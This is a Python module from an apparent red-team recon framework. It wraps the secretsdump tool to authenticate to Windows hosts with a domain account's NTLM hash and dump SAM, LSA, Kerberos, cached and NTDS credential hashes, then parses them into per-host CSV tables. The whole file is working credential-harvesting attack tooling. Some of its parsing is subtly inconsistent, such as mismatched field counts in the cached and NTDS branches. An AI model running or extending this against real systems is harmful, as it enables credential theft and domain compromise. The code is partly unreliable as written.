import logging

from redReconAbstractBaseClassCredentialsRequired import redReconAbstractBaseClassCredentialsRequired
from functions.helpers import settings

class secretsDump(redReconAbstractBaseClassCredentialsRequired):
    dependencies = [settings.SECRETSDUMP]

    def craftCommand(self, preface=None, creds=None):
        logger = logging.getLogger(__name__)
        if preface is not None:
            command = preface + " "
        else:
            command = ""

        if creds is not None:
            self.creds = creds;

        command += settings.SECRETSDUMP
        command += ' ' + self.creds.domain
        command += '/'
        command += self.creds.username
        command += '@{} '
        command += '-outputfile {} '
        command += '-hashes '
        command += self.creds.hashed_password

        self.command = command
        return self.command

    def parse(self, inputDirectory):
        logger = logging.getLogger(__name__)

        self.title = []
        self.header = []
        self.data = []

        self.title.append('sam')
        self.header.append('IP Address,Username,SID,LM Hash,NTLM Hash')
        self.data.append([])
        self.title.append('lsa')
        self.header.append('IP Address,Account,LM Hash,NTLM Hash')
        self.data.append([])
        self.title.append('kerberos')
        self.header.append('IP Address,Account,Encryption Algorithm,Hash')
        self.data.append([])
        self.title.append('cached')
        self.header.append('IP Address,Username,Hash,Hostname,Domain')
        self.data.append([])
        self.title.append('ntds')
        self.header.append('IP Address,Account,SID,LM Hash,NTLM Hash')
        self.data.append([])

        files = self.searchFiles(inputDirectory, "*")
        for file in files:
            host = file[0]
            extension = file[1]
            lines = file[2]
            for line in lines:
                if extension == 'sam':
                    split_string = line.rstrip('\n').split(':')
                    if len(split_string) >= 4:
                        self.data[0].append('{0},{1},{2},{3},{4}'.format(host, split_string[0], split_string[1], split_string[2], split_string[3]))
                elif extension == 'secrets':
                    split_string = line.rstrip('\n').split(':')
                    if len(split_string) >= 3 and split_string[0] != 'NL$KM' and split_string[0] != 'DPAPI_SYSTEM':
                        self.data[1].append('{0},{1},{2},{3}'.format(host, split_string[0], split_string[1], split_string[2]))
                elif extension == 'kerberos':
                    split_string = line.rstrip('\n').split(':')
                    if len(split_string) >= 3:
                        self.data[2].append('{0},{1},{2},{3}'.format(host, split_string[0], split_string[1], split_string[2]))
                elif extension == 'cached':
                    split_string = line.rstrip('\n').split(':')
                    if len(split_string) >= 7:
                        self.data[3].append('{0},{1},{2},{3},{4},{5},{6},{7}'.format(host, split_string[0], split_string[1],
                                                                                    split_string[2], split_string[3],
                                                                                    split_string[4], split_string[5],
                                                                                    split_string[6]))
                elif extension == 'ntds':
                    split_string = line.rstrip('\n').split(':')
                    if len(split_string) >= 4:
                        self.data[4].append('{0},{1},{2},{3},{4}'.format(host, split_string[0], split_string[1],
                                                         split_string[2], split_string[3], split_string[4]))

        return self.title, self.header, self.data